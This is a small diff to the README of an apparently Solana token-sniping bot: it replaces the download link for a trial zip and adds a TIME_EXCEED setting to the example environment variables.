@@ -60,7 +60,7 @@ src/
 ```
 ---
 ## Trial Version
-🗂️ [solana-raypump-sniper(trial).zip](https://github.com/user-attachments/files/18739348/solana-raypump-sniper.trial.zip)
+🗂️ [solana-raypump-sniper(trial).zip](https://github.com/user-attachments/files/18749157/solana-raypump-sniper.trial.zip)
 
 ### How To Run
 1. Environment Variables Settings
@@ -79,6 +79,7 @@ YELLOWSTONE_RPC_WSS=ws://elite.rpc.solanavibestation.com/?api_key=your_api_key_h
 JITO_TIP_VALUE=0.004
 BUY_THRESHOLD=1000
 SELL_THRESHOLD=300
+TIME_EXCEED=60
 ```
 2. Add the wallet address you want to block on a new line and save the file.
 ```
